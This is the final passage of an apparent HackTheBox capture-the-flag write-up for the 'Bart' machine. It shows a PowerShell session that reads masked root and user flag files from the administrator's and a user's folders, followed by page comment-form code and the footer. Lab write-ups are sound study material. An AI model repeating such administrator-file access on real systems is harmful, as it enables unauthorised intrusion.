+<span class="go">PS C:\&gt; Z:</span>
+<span class="go">PS Z:\&gt; cd users\administrator\desktop</span>
+<span class="go">PS Z:\users\administrator\desktop&gt; dir</span>
+
+
+<span class="go">    Directory: Z:\users\administrator\desktop</span>
+
+
+<span class="go">Mode                LastWriteTime         Length Name                          </span>
+<span class="go">----                -------------         ------ ----                          </span>
+<span class="go">-a----       11/02/2018     12:51             32 root.txt                      </span>
+
+
+<span class="go">PS Z:\users\administrator\desktop&gt; type root.txt</span>
+<span class="go">00****************************dc</span>
+</pre></div>
+
+
+<div class="highlight"><pre><span></span><span class="gp">PS Z:\users\h.potter&gt; </span><span class="nb">type </span><span class="n">user</span><span class="p">.</span><span class="n">txt</span>
+<span class="go">62****************************0f</span>
+</pre></div>
+			<style>
+#pcs-comment-form input,
+#pcs-comment-form textarea {
+	width: 100%;
+}
+#pcs-comment-form-display-replyto {
+	border: solid 1px black;
+	padding: 2px;
+}
+#pcs-comment-form-display-replyto p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+#pcs-comments ul {
+	list-style: none;
+}
+#pcs-comments .comment-left {
+	display: table-cell;
+	padding-right: 10px;
+}
+#pcs-comments .comment-body {
+	display: table-cell;
+	vertical-align: top;
+	width: 100%;
+}
+</style>
+
+	<section id="pcs-comments">
+	<header>
+		<h2>Comments</h2>
+		<hr/>
+	</header>
+		<p>There are no comments yet.</p>
+	<section>
+	<form id="pcs-comment-form" action="#">
+		<legend>Add a Comment</legend>
+		<input type="hidden" id="pcs-comment-form-input-replyto">
+		<fieldset>
+			<label for="pcs-comment-form-input-name">Name</label>
+			<input  id="pcs-comment-form-input-name" type="text" placeholder="Enter your name or nickname" />
+		</fieldset>
+		<fieldset>
+			<label for="pcs-comment-form-input-website">Website</label>
+			<input  id="pcs-comment-form-input-website" type="text" placeholder="Enter your website (optional)" />
+		</fieldset>
+		<fieldset>
+			<label   for="pcs-comment-form-input-textarea">Your Comment</label>
+			<textarea id="pcs-comment-form-input-textarea" rows="5" style="resize:vertical;" placeholder="Your comment"></textarea>
+			<p>You can use the <a href="https://en.wikipedia.org/wiki/Markdown">Markdown</a> syntax to format your comment.</p>
+			<div style="display: none; " id="pcs-comment-form-display-replyto"></div>
+		</fieldset>
+
+		<button type="submit"
+				id="pcs-comment-form-button-submit"
+				>Post via email</button>
+
+			<a href="https://sittingducks.io/feeds/comment.Bart.atom.xml">
+				Comment Atom Feed
+			</a>
+	</form>
+</section>
+
+</section>
+
+			<script type="text/javascript" src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
+	<script type="text/javascript" src="https://sittingducks.io/theme/js/comments.js"></script>
+	<script type="text/javascript">
+		$(document).ready(function() {
+			CommentSystem.email_user   = "sittingducks.io";
+			CommentSystem.email_domain = "protonmail.com";
+			CommentSystem.display_replyto_html = function(comment_content, article_slug, author) { 
+				return ''
+					+ '<button style="float:right;" onclick="CommentSystem.cancelReply(); return false;" title="Cancel the reply">'
+					+ 	'×'
+					+ '</button>'
+					+ '<p>This comment will be posted as a reply to \'<a title="'+comment_content+'" href="#comment-'+article_slug+'">'+author+'</a>\'</p>';
+			};
+
+			$('#pcs-comment-form').on("submit",
+				function( event )
+				{
+					event.preventDefault();
+					$(location).attr('href', CommentSystem.getMailtoLink("Bart"));
+				}
+			);
+		});
+	</script>
+
+
+      </div><!-- .entry-content -->
+      <br /><br />
+      <div class="article_meta">
+        Tags:
+          <a href="https://sittingducks.io/tag/hackthebox.html">HackTheBox</a>      </div>
+    </div>
+  </div>
+</article><!-- #post-## -->
+                </div>
+              </div><!-- #main -->
+          </div><!-- #primary -->
+        </div>
+      </div><!-- close .row -->
+    </div><!-- close .container -->
+  </div><!-- close .site-content -->
+
+
+
+
+  <div id="footer-area">
+    <footer id="colophon" class="site-footer" role="contentinfo">
+      <div class="site-info container">
+        <div class="row">
+                    <div class="copyright col-md-12">
+                    <a href="https://sittingducks.io/pages/privacy-policy">Privacy Policy</a> | 
+                    <a href="https://sittingducks.io/feeds/all.atom.xml">Atom Feed</a> | 
+                    <a href="https://sittingducks.io/sitemap.xml">Sitemap</a><br />
+                    &copy; 2019 <a href="https://sittingducks.io">Marco Meli</a> </div>
+        </div>
+      </div><!-- .site-info -->
+      <div class="scroll-to-top" style="display: none;"><i class="fa fa-angle-up"></i></div><!-- .scroll-to-top -->
+    </footer><!-- #colophon -->
+  </div>
+
+  <script type="text/javascript">
+    window.addEventListener('load', function(){
+    if (window.location.pathname != '/' && window.location.pathname != '/index.html'){
+      window.scroll(0, document.getElementById('main').offsetTop);
+    }})
+  </script>
+
+  
+ <!-- <script src="https://sittingducks.io/theme/js/jquery.min.js"></script> -->
+	<!-- Make sure jquery is loaded first, then load colorbox -->
+  <script src="https://sittingducks.io/theme/js/jquery.colorbox-min.js"></script>
+  <script src="https://sittingducks.io/theme/js/load-colorbox.js"></script>
+
+
+  
+  
+</body>
+</html>
